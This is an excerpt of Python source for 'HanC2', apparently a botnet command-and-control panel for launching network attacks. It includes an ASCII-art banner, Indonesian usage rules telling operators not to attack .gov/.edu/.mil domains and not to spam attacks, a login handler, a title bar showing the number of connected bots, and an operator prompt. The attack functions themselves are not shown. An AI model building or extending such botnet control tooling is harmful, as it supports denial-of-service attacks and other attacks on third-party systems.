...
⠀⠀⠀⠀⠀⠀⠆⡇⢸⡠⣐⠥⡝⠶⠛⢿⠧
⠀⠀⠀⠀⢀⣠⣼⣧⣼⣷⣁⣒⣡⡴⠀⢸⡆
⠀⠀⠀⣪⠿⠗⠂⠀⠔⠊⠉⠉⠉⠉⢉⢢⠇            {lightwhite}HanC2{gray}
⠀⣠⠮⡷⠶⠿⠿⠭⠤⠤⣕⣲⣶⣶⠾⠋⠀
⠊⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

rules = f"""                {lightwhite}1. {gray}Jan Attack .gov/.gob/.edu/.mil domains  
{lightwhite}2. {gray}Jangan spam attacks"""
...
def handle_client(client, address):
    send(client, f'\x1bHanC2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
...
def update_title(client, name):
    while 1:
        try:
            send(client, f"\33]0;H | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Ha | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Han | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;HanC | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;HanC | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;HanC2 | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;HanC2 | Running: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;HanC | Running: {len(bots)} | Username: {name}\a", False)
...
def command_line(client, username):
    ...
    prompt = f'{color("LIGHTBLACK_EX")}[{color("WHITE")}HanC2{color("LIGHTBLACK_EX")}@{color("WHITE")}{username}{color("LIGHTBLACK_EX")}]:~# {color("LIGHTBLACK_EX")}'
